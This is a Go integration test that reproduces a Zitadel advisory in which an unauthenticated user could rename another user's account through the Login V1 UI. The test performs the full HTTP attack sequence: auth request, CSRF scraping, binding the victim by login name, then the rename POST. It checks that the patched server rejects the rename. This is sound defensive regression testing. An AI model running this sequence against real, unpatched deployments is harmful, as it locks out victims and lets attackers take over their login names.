//go:build integration

// This file contains an end-to-end reproduction of GHSA-4hgj-wm6c-q7p2, an unauthenticated
// account-rename in the server-rendered Login V1 UI.
//
// The vulnerability: POST /ui/login/username/change (handleChangeUsername) renamed the account
// identified by authReq.UserID without checking that the login flow had reached the change-username
// step or that any factor had succeeded. authReq.UserID is bound as soon as a login name is
// submitted (POST /ui/login/loginname -> checkLoginName -> SetUserInfo), which requires no secret.
// An UNAUTHENTICATED attacker could therefore start a flow, submit a victim's login name to bind
// authReq.UserID to that victim, and then POST a new username to rename the victim - including
// instance admins - locking them out and freeing their login name for squatting.
//
// This test drives the exact attack over raw HTTP against a running Zitadel instance:
//
//  1. authorize (create a V1 auth request)  ->  2. load login page (grab CSRF)
//     ->  3. POST the victim's login name (binds authReq.UserID, no factor)
//     ->  4. POST a new username (the rename)
//
// It first proves the exploit precondition actually held - step 3 advanced the flow to the victim's
// password step, i.e. authReq.UserID was bound with no factor - and then asserts, over gRPC, that
// the victim's username is UNCHANGED. Against the unpatched code the second assertion fails (the
// rename lands); against the fixed code it passes (the gate on ChangeUsernameStep rejects the
// request before the command runs). That is the red -> green signal for the fix.
//
// The outcome assertion is behavioral (the account's username) rather than on the rendered page: the
// fixed handler rejects by re-rendering the current step with a nil error, so there is no distinctive
// error code to match, and the true security property is simply that no rename occurred. The step-3
// precondition check guards against a false green: if any upstream hop silently broke (no V1 id,
// wrong CSRF, rejected login name), the rename would never fire even against unpatched code and the
// unchanged-username assertion would pass vacuously.
//
// Requires a running backend + database. Run with:
//
//	go test -tags integration ./internal/api/ui/login/integration_test/...
package login_test

import (
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"testing"
	"time"

	"github.com/muhlemmer/gu"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/zitadel/oidc/v3/pkg/oidc"

	"github.com/zitadel/zitadel/internal/api/ui/login"
	"github.com/zitadel/zitadel/internal/integration"
	"github.com/zitadel/zitadel/pkg/grpc/app"
	feature "github.com/zitadel/zitadel/pkg/grpc/feature/v2"
	object "github.com/zitadel/zitadel/pkg/grpc/object/v2"
	user "github.com/zitadel/zitadel/pkg/grpc/user/v2"
)

// TestChangeUsername_UnauthenticatedRename_IsRejected reproduces the core exploit and asserts the
// fix rejects it. It is the end-to-end, behavioral red -> green test for GHSA-4hgj-wm6c-q7p2.
func TestChangeUsername_UnauthenticatedRename_IsRejected(t *testing.T) {
	// --- Server setup (all via gRPC as the IAM owner) -------------------------------------------

	// Force Login V1. Three things select V1 at auth-request creation (internal/api/oidc/auth_request.go):
	// (a) the instance feature LoginV2.Required must be false, (b) the OIDC app's login version must be
	// unspecified/V1, and (c) the authorize request must NOT carry the x-zitadel-login-client header.
	// We pin (a) here explicitly so the test does not depend on the instance default.
	integration.EnsureInstanceFeature(t, CTX, Instance,
		&feature.SetInstanceFeaturesRequest{LoginV2: &feature.LoginV2{Required: false}},
		func(tt *assert.CollectT, got *feature.GetInstanceFeaturesResponse) {
			assert.False(tt, got.GetLoginV2().GetRequired())
		},
	)

	// A project + OIDC app. loginVersion is left nil (unspecified => V1). The redirect URI only has to
	// be registered; the attack never actually redeems a code there.
	redirectURI := "http://localhost:9999/callback"
	project := Instance.CreateProject(CTX, t, Instance.DefaultOrg.GetId(), integration.RandString(10), false, false)
	oidcApp, err := Instance.CreateOIDCClient(CTX, redirectURI, "", project.GetId(),
		app.OIDCAppType_OIDC_APP_TYPE_WEB, app.OIDCAuthMethodType_OIDC_AUTH_METHOD_TYPE_NONE, true)
	require.NoError(t, err)
	clientID := oidcApp.GetClientId()

	// The victim: an active human with a password (so its first-factor step is the password page). We
	// create it with a known username so we can both submit its login name and detect a rename.
	victimUsername := "victim-" + integration.RandString(8)
	victimID, victimLoginName := createVictim(t, victimUsername)

	// --- Attacker HTTP client -------------------------------------------------------------------

	// One shared cookie jar for the WHOLE flow. This is mandatory: the server issues a user-agent
	// cookie (zitadel.useragent) on the authorize response and binds the created auth request to that
	// user-agent id; the loginname/username-change handlers later resolve the auth request by
	// (authRequestID, userAgentID). A different jar (or no jar) would make it unresolvable. The csrf
	// cookie also lives here.
	jar, err := cookiejar.New(nil)
	require.NoError(t, err)
	httpClient := &http.Client{
		Jar: jar,
		// Never auto-follow redirects: we want each hop's response as-is.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	issuer := Instance.OIDCIssuer() // http://<instance-domain>:<port>

	// Step 1: create a Login V1 auth request by hitting the OIDC authorize endpoint WITHOUT the
	// login-client header. The response is a 302 to /ui/login/login?authRequestID=<id>; we extract id.
	authURL := issuer + "/oauth/v2/authorize?" + url.Values{
		"client_id":             {clientID},
		"redirect_uri":          {redirectURI},
		"response_type":         {"code"},
		"scope":                 {"openid"},
		"state":                 {"attacker-state"},
		"code_challenge":        {oidc.NewSHACodeChallenge(integration.CodeVerifier)},
		"code_challenge_method": {"S256"},
	}.Encode()
	loc := getLocation(t, httpClient, authURL)
	authRequestID := loc.Query().Get(login.QueryAuthRequestID)
	require.NotEmpty(t, authRequestID, "expected a V1 auth request id in the authorize redirect %q", loc.String())

	// Step 2: load the login page. This renders the login form and lets us scrape the CSRF token,
	// valid for any subsequent POST in this session (it is bound to the csrf cookie in the jar).
	loginPageURL := issuer + login.HandlerPrefix + login.EndpointLogin + "?" + login.QueryAuthRequestID + "=" + authRequestID
	csrfToken := scrapeCSRF(t, httpClient, loginPageURL)

	// Step 3: the binding. POST the victim's login name. handleLoginNameCheck -> checkLoginName ->
	// SetUserInfo binds authReq.UserID to the victim. NO factor is required - this is the whole point:
	// an unauthenticated caller can point the auth request at any account by name alone.
	loginNameForm := url.Values{
		login.QueryAuthRequestID: {authRequestID},
		"gorilla.csrf.Token":     {csrfToken},
		"loginName":              {victimLoginName},
	}
	loginNameURL := issuer + login.HandlerPrefix + login.EndpointLoginName
	loginNameBody := doPostForm(t, httpClient, loginNameURL, loginNameForm)

	// Prove the precondition held: the login name resolved and bound authReq.UserID to the victim,
	// advancing the flow to the password (first-factor) step. renderNextStep renders that step inline
	// (200), so the response body is the password page: it carries a name="password" input and echoes
	// the bound account's login name. Both markers are locale-independent. Without this check a broken
	// upstream hop would make the later unchanged-username assertion pass vacuously - a false green even
	// against unpatched code.
	require.Contains(t, loginNameBody, `name="password"`,
		"login-name POST did not advance to the password step; the victim was not bound (a later green would be vacuous)")
	require.Contains(t, loginNameBody, victimUsername,
		"password step is not bound to the victim; login-name binding did not take effect")

	// Step 4: the attack. POST a new username. Before the fix this renamed the bound victim; the fix
	// gates the handler on the current step being *domain.ChangeUsernameStep (only produced after the
	// first factor and any required MFA), so this request is rejected.
	newUsername := "pwned-" + integration.RandString(8)
	changeForm := url.Values{
		login.QueryAuthRequestID: {authRequestID},
		"gorilla.csrf.Token":     {csrfToken},
		"username":               {newUsername},
	}
	changeURL := issuer + login.HandlerPrefix + login.EndpointChangeUsername
	doPostForm(t, httpClient, changeURL, changeForm)

	// The core security property: the victim's username must remain unchanged. Poll for a window so a
	// vulnerable rename that projects late still fails the test (an immediate single read could race a
	// slow projection and give a false green against unpatched code).
	requireUsernameUnchanged(t, victimID, victimUsername, 5*time.Second, 250*time.Millisecond)
}

// --- helpers specific to the username-change reproduction --------------------------------------
//
// doGet, getLocation, scrapeCSRF, doPostForm and the CTX/Instance globals are defined in
// external_login_test.go, which shares this package and build tag.

// createVictim creates an active human user with the given username, a verified email and a password
// (so its login flow's first factor is the password step) and returns its id and the preferred login
// name to submit at /ui/login/loginname.
func createVictim(t *testing.T, username string) (userID, loginName string) {
	t.Helper()
	resp, err := Instance.Client.UserV2.AddHumanUser(CTX, &user.AddHumanUserRequest{
		Organization: &object.Organization{
			Org: &object.Organization_OrgId{OrgId: Instance.DefaultOrg.GetId()},
		},
		Username: gu.Ptr(username),
		Profile: &user.SetHumanProfile{
			GivenName:         "Vic",
			FamilyName:        "Tim",
			PreferredLanguage: gu.Ptr("en"),
		},
		Email: &user.SetHumanEmail{
			Email:        username + "@victim.test",
			Verification: &user.SetHumanEmail_IsVerified{IsVerified: true},
		},
		PasswordType: &user.AddHumanUserRequest_Password{
			Password: &user.Password{Password: "Password1!", ChangeRequired: false},
		},
	})
	require.NoError(t, err)
	Instance.TriggerUserByID(CTX, resp.GetUserId())

	got, err := Instance.Client.UserV2.GetUserByID(CTX, &user.GetUserByIDRequest{UserId: resp.GetUserId()})
	require.NoError(t, err)
	loginName = got.GetUser().GetPreferredLoginName()
	require.NotEmpty(t, loginName)
	require.Equal(t, username, got.GetUser().GetUsername())
	return resp.GetUserId(), loginName
}

// requireUsernameUnchanged fails if the user's username changes away from want within waitFor.
func requireUsernameUnchanged(t *testing.T, userID, want string, waitFor, tick time.Duration) {
	t.Helper()
	pollFor(t, waitFor, tick, func() {
		resp, err := Instance.Client.UserV2.GetUserByID(CTX, &user.GetUserByIDRequest{UserId: userID})
		require.NoError(t, err)
		require.Equal(t, want, resp.GetUser().GetUsername(),
			"victim username changed to %q - unauthenticated rename succeeded", resp.GetUser().GetUsername())
	})
}
